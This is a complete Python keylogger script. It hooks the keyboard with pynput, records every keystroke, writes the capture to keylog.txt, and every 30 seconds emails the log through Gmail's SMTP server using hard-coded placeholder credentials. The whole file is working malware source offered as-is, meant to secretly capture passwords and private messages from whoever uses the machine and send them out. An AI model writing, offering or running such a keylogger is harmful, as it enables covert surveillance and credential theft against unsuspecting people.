import pynput.keyboard
import smtplib
import threading
import os
from time import sleep

log = ""
log_file = "keylog.txt"

def callback_function(key):
    global log
    try:
        log = log + str(key.char)
    except AttributeError:
        if key == key.space:
            log = log + " "
        else:
            log = log + str(key)
    except Exception as e:
        print(f"Error occurred: {e}")

def send_email(email, password, message):
    try:
        email_server = smtplib.SMTP("smtp.gmail.com", 587)
        email_server.starttls()
        email_server.login(email, password)
        email_server.sendmail(email, email, message)
        email_server.quit()
        print("Email sent successfully.")
    except Exception as e:
        print(f"Failed to send email: {e}")

def write_log_to_file():
    global log
    try:
        with open(log_file, "a") as f:
            f.write(log + "\n")
    except Exception as e:
        print(f"Error writing to log file: {e}")

def thread_function():
    global log
    write_log_to_file()
    send_email("user@gmail.com", "password", log.encode('utf-8'))
    log = ""
    timer_object = threading.Timer(30, thread_function)
    timer_object.start()

keylogger_listener = pynput.keyboard.Listener(on_press=callback_function)
with keylogger_listener:
    thread_function()
    keylogger_listener.join()
